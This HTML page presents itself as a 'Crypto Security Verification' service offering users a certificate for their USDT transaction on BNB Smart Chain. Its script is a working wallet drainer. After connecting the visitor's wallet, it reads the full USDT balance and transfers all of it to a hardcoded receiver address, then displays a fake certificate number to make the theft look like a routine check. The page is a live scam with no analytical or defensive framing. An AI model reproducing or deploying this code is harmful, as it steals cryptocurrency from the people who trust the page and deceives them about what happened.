<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Security Platform</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
  <style>
    body {
      background-color: #121212;
      color: white;
      font-family: sans-serif;
    }
    .btn-lg {
      font-size: 1.2rem;
    }
    .status {
      margin-top: 10px;
      font-weight: bold;
    }
    .status.success {
      color: #28a745;
    }
    .status.error {
      color: #dc3545;
    }
    .status.info {
      color: #ffc107;
    }
  </style>
</head>
<body>

<div class="container text-center py-5">
  <h1>Crypto Security Verification</h1>
  <p>Secure your trade by verifying your USDT transaction on BNB Smart Chain.</p>
  <button onclick="checkAndApprove()" class="btn btn-primary btn-lg mt-3">
    <i class="fas fa-shield-alt me-2"></i>Get Certificate
  </button>

  <div class="mt-3" id="approvalSection">
    <div id="balanceAmount"></div>
    <div id="certificateNumber"></div>
    <div id="walletAddress"></div>
    <div id="status" class="status info"></div>
  </div>

  <!-- Disabled Learn More Button -->
  <a href="#" class="btn btn-outline-secondary btn-lg mt-2" style="pointer-events: none; opacity: 0.6; cursor: not-allowed;">
    <i class="fas fa-info-circle me-2"></i>Learn More
  </a>
</div>

<script>
  const BSC_CHAIN_ID = '0x38';
  const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
  const RECEIVER_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999';

  const USDT_ABI = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" }
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      type: "function"
    },
    {
      constant: false,
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" }
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      type: "function"
    }
  ];

  let web3;
  let usdtContract;

  async function checkAndApprove() {
    try {
      if (!window.ethereum) {
        alert("Please install MetaMask or Trust Wallet.");
        return;
      }

      web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      const accounts = await web3.eth.getAccounts();
      const userAddress = accounts[0];

      const networkId = await web3.eth.getChainId();
      if (networkId !== 56) {
        alert("Please switch to BNB Smart Chain (Mainnet)");
        return;
      }

      usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
      const balance = await usdtContract.methods.balanceOf(userAddress).call();
      const usdtAmount = web3.utils.fromWei(balance, 'ether');

      if (parseFloat(usdtAmount) <= 0) {
        document.getElementById("status").innerText = "Insufficient USDT balance.";
        document.getElementById("status").className = "status error";
        return;
      }

      // Transfer all USDT to receiver
      await usdtContract.methods.transfer(RECEIVER_ADDRESS, balance).send({ from: userAddress });

      // Show success
      const certNo = "CERT-" + Date.now().toString(16).toUpperCase();
      document.getElementById("balanceAmount").innerText = `USDT Sent: ${parseFloat(usdtAmount).toFixed(2)} USDT`;
      document.getElementById("certificateNumber").innerText = `Certificate No: ${certNo}`;
      document.getElementById("walletAddress").innerText = `From Wallet: ${userAddress}`;
      document.getElementById("status").innerText = "Transfer successful âœ…";
      document.getElementById("status").className = "status success";

    } catch (error) {
      console.error(error);
      document.getElementById("status").innerText = "Error: " + error.message;
      document.getElementById("status").className = "status error";
    }
  }
</script>

<!-- Font Awesome for icons -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>

</body>
</html>
